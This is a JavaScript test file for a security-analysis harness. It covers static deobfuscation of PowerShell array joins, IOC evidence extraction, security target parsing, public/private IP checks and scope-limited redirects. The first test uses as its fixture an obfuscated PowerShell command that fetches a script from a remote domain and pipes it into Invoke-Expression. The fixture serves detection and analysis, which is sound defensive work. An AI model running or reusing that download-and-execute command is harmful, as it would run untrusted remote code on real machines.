import test from 'node:test';
import assert from 'node:assert/strict';
import {
  buildIntelPlan,
  buildPowerShellIocEvidence,
  collectToolTargets,
  deobfuscatePowerShellArrayJoins,
  extractAiText,
  extractSecurityTargets,
  isPublicIpv4,
  removeSessionIndexEntry,
  renderBalancedContext,
  resolveScopedRedirect,
  splitSseLines,
  toolCallKey,
} from './src/harness.mjs';

test('statically recovers a PowerShell array permutation without evaluating it', () => {
  const command = String.raw`%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe Invoke-RestMethod (@('oc','o','ph','inf','.inf','o','ard','ot','u_H1','KJ')[3,0,6,2,7,1,4,5] -join $zoBd_mI) | Invoke-Expression`;
  const result = deobfuscatePowerShellArrayJoins(command);
  assert.equal(result.text, String.raw`%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe Invoke-RestMethod (infocardphoto.info) | Invoke-Expression`);
  assert.equal(result.candidates.length, 1);
  assert.equal(result.candidates[0].value, 'infocardphoto.info');
  assert.match(result.candidates[0].assumption, /\$zoBd_mI.*assumes it is empty/);
  assert.equal(result.confirmedText, command);
});

test('PowerShell array permutations support only proven-empty or explicitly assumed separators', () => {
  const literal = deobfuscatePowerShellArrayJoins("@('b','a')[1,0] -join ''");
  const nullJoin = deobfuscatePowerShellArrayJoins("@('b','a')[1,0] -join $null");
  const assumed = deobfuscatePowerShellArrayJoins("@('b','a')[1,0] -join $unknown");
  assert.deepEqual(literal.candidates.map(({ value, assumption }) => ({ value, assumption })), [{ value: 'ab', assumption: '' }]);
  assert.deepEqual(nullJoin.candidates.map(({ value, assumption }) => ({ value, assumption })), [{ value: 'ab', assumption: '' }]);
  assert.equal(assumed.candidates[0].value, 'ab');
  assert.match(assumed.candidates[0].assumption, /unresolved/);
});

test('PowerShell parser supports parenthesized arrays and negative indices', () => {
  const result = deobfuscatePowerShellArrayJoins("('zero','one','two')[-1,-3] -join $null");
  assert.equal(result.text, 'twozero');
  assert.equal(result.confirmedText, 'twozero');
  assert.equal(result.candidates[0].arrayKind, '(...)');
});

test('malformed and valid prefix noise cannot starve a trailing expression within MCP input bounds', () => {
  const target = "@('ample','ex','.','org')[1,0,2,3] -join ''";
  const malformedNoise = '@('.repeat(300) + target;
  const malformed = deobfuscatePowerShellArrayJoins(malformedNoise);
  assert.ok(malformed.candidates.some(candidate => candidate.value === 'example.org'));

  const validNoise = ("@('x')[0] -join '';".repeat(300)) + target;
  assert.ok(validNoise.length < 12000);
  const covered = deobfuscatePowerShellArrayJoins(validNoise);
  assert.ok(covered.candidates.some(candidate => candidate.value === 'example.org'));
  assert.equal(covered.limitReached, false);

  const oversizedNoise = ("@('x')[0] -join '';".repeat(1100)) + target;
  const sampled = deobfuscatePowerShellArrayJoins(oversizedNoise);
  assert.ok(sampled.candidates.some(candidate => candidate.value === 'example.org'));
  assert.equal(sampled.limitReached, true);
});

test('base64 and hex decoded PowerShell layers are eligible for the same bounded static pass', () => {
  const layer = "('ample','ex','.','org')[-3,-4,-2,-1] -join ''";
  const wrapped = Buffer.from(layer, 'utf8').toString('base64');
  const decodedLayer = Buffer.from(wrapped, 'base64').toString('utf8');
  assert.equal(deobfuscatePowerShellArrayJoins(decodedLayer).confirmedText, 'example.org');
  const hexWrapped = Buffer.from(layer, 'utf8').toString('hex');
  const hexDecodedLayer = Buffer.from(hexWrapped, 'hex').toString('utf8');
  assert.equal(deobfuscatePowerShellArrayJoins(hexDecodedLayer).confirmedText, 'example.org');
});

test('IOC evidence keeps raw unused literals while adding deterministic reconstructions', () => {
  const source = "@('https://unused.example/path','safe')[1] -join ''";
  const evidence = buildPowerShellIocEvidence(source);
  assert.match(evidence.confirmedEvidenceText, /https:\/\/unused\.example\/path/);
  assert.match(evidence.confirmedEvidenceText, /\nsafe$/);
});

test('unresolved separators never enter confirmed IOC evidence', () => {
  const source = "$s='/'; @('example','.com')[0,1] -join $s";
  const evidence = buildPowerShellIocEvidence(source);
  assert.equal(evidence.confirmedEvidenceText, source);
  assert.equal(evidence.deobfuscation.candidates[0].value, 'example.com');
  assert.match(evidence.deobfuscation.candidates[0].assumption, /unresolved/);
});

test('PowerShell array permutation parser rejects dynamic, malformed and out-of-range forms', () => {
  const rejected = [
    "@('a',$piece)[0,1] -join ''",
    "@('a','b')[0..1] -join ''",
    "@('a','b')[2] -join ''",
    "@('a','b')[-3] -join ''",
    "@('a','b')[1,0] -join '.'",
    "@('a','b')[1,0] -join $('')",
    '@("$dynamic","b")[0,1] -join \'\'',
    "@('a','b')[1,0 -join ''",
  ];
  for (const source of rejected) {
    const result = deobfuscatePowerShellArrayJoins(source);
    assert.equal(result.text, source, source);
    assert.deepEqual(result.candidates, [], source);
  }
});

test('email targets do not silently become domain targets', () => {
  const targets = extractSecurityTargets('Check hunter@acme.com for breach exposure');
  assert.deepEqual(targets.emails, ['hunter@acme.com']);
  assert.deepEqual(targets.domains, []);
});

test('explicit URLs still produce URL and domain targets', () => {
  const targets = extractSecurityTargets('Inspect https://login.example.com/reset).');
  assert.equal(targets.urls[0], 'https://login.example.com/reset');
  assert.deepEqual(targets.domains, ['login.example.com']);
});

test('public and private IPs are separated for automatic lookups', () => {
  const targets = extractSecurityTargets('Compare 8.8.8.8 with 192.168.1.10');
  assert.deepEqual(targets.ips, ['8.8.8.8', '192.168.1.10']);
  assert.deepEqual(targets.publicIps, ['8.8.8.8']);
});

test('automatic IP enrichment rejects every special-purpose IPv4 class', () => {
  for (const ip of ['100.64.0.1', '169.254.169.254', '192.0.2.1', '198.18.0.1', '203.0.113.7', '224.0.0.1', '255.255.255.255']) {
    assert.equal(isPublicIpv4(ip), false, ip);
  }
  assert.equal(isPublicIpv4('8.8.8.8'), true);
});

test('Workers AI response shapes normalize to text', () => {
  assert.equal(extractAiText({ response: 'legacy' }), 'legacy');
  assert.equal(extractAiText({ choices: [{ message: { content: 'chat' } }] }), 'chat');
  assert.equal(extractAiText({ choices: [{ delta: { content: 'stream' } }] }), 'stream');
  assert.equal(extractAiText({ result: { response: 'wrapped' } }), 'wrapped');
});

test('balanced evidence budgeting gives every result representation', () => {
  const rendered = renderBalancedContext(['T1 ' + 'a'.repeat(2000), 'T2 ' + 'b'.repeat(2000), 'T3 ' + 'c'.repeat(2000)], 900, 800);
  assert.ok(rendered.length <= 900);
  assert.match(rendered, /T1/);
  assert.match(rendered, /T2/);
  assert.match(rendered, /T3/);
});

test('tiny evidence budgets still represent every block', () => {
  const rendered = renderBalancedContext(['A-first', 'B-second', 'C-third'], 8, 800);
  assert.equal(rendered, 'A\n\nB\n\nC');
});

test('every target-bearing alias is included in scope validation', () => {
  assert.deepEqual(collectToolTargets('safe.example', {
    image: 'https://images.example/a.jpg',
    sample: 'https://samples.example/a.bin',
    path: '/evidence/outside-scope.pcap',
    addr: 'OUT_OF_SCOPE_WALLET',
    token: 'OUT_OF_SCOPE_TOKEN',
  }), ['safe.example', 'images.example', 'samples.example', '/evidence/outside-scope.pcap', 'out_of_scope_wallet', 'out_of_scope_token']);
});

test('redirects may stay on host but cannot escape target scope', () => {
  assert.equal(resolveScopedRedirect('https://safe.example/a', '/b').toString(), 'https://safe.example/b');
  assert.throws(() => resolveScopedRedirect('https://safe.example/a', 'https://other.example/b'), /outside the authorized target/);
});

test('session deletion removes both legacy object and current string index entries', () => {
  assert.deepEqual(removeSessionIndexEntry(['keep', 'remove', { id: 'remove' }, { id: 'other' }], 'remove'), ['keep', { id: 'other' }]);
});

test('intel plan is stable and profile-aware', () => {
  const compact = buildIntelPlan({ cveIds: ['CVE-2026-1'], ips: ['8.8.8.8'], domains: ['example.com'] }, 'debug');
  assert.deepEqual(compact.map(x => x.tool), [
    'nvd_lookup', 'epss_lookup', 'kev_lookup',
    'rdap_ip', 'reverse_dns', 'ip_geo',
    'rdap_domain', 'dns_lookup', 'cert_ct',
  ]);
  assert.equal(buildIntelPlan({ ips: ['8.8.8.8'] }, 'full').length, 5);
});

test('tool call identity deduplicates exact calls, not whole tools', () => {
  assert.equal(toolCallKey('DNS_LOOKUP', 'Example.COM'), 'dns_lookup::example.com');
  assert.notEqual(toolCallKey('dns_lookup', 'one.example'), toolCallKey('dns_lookup', 'two.example'));
});

test('SSE parser flushes a final non-newline-terminated event', () => {
  const first = splitSseLines('data: {"response":"one"}\n' + 'data: {"response":"tw');
  assert.deepEqual(first.lines, ['data: {"response":"one"}']);
  assert.equal(first.remainder, 'data: {"response":"tw');
  const final = splitSseLines(first.remainder + 'o"}', true);
  assert.deepEqual(final.lines, ['data: {"response":"two"}']);
  assert.equal(final.remainder, '');
});
